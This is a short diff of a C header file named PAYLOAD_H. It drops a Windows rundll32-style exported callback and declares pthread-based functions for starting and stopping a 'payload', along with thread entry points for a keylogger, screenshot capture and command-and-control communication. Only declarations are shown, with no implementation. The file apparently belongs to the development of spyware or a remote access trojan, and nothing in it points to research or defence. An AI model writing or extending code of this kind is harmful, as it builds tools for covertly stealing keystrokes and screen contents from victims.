@@ -1,9 +1,16 @@
 #ifndef PAYLOAD_H
 #define PAYLOAD_H
 
-#include <windows.h>
+#include <pthread.h>
 
-void RunPayload();
-__declspec(dllexport) void CALLBACK RunPayload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
+// Payload functions
+void init_payload();
+void stop_payload();
+int is_payload_running();
 
-#endif
+// Thread main functions
+void* keylogger_main(void* arg);
+void* screenshot_main(void* arg);
+void* c2_communication_main(void* arg);
+
+#endif // PAYLOAD_H
